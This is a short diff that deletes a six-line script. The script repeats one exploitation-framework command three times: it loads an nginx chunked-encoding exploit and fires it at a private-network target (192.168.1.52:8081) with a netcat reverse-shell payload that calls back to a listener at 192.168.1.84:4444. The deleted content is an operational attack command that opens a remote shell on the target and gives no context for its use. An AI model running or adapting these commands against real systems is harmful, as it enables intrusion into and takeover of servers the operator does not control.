@@ -1,6 +1,0 @@
-load linux_x64_nginx_chunked
-pwn rhost 192.168.1.52 rport 8081 lhost 192.168.1.84 lport 4444 payload reverse/linux_netcat
-load linux_x64_nginx_chunked
-pwn rhost 192.168.1.52 rport 8081 lhost 192.168.1.84 lport 4444 payload reverse/linux_netcat
-load linux_x64_nginx_chunked
-pwn rhost 192.168.1.52 rport 8081 lhost 192.168.1.84 lport 4444 payload reverse/linux_netcat
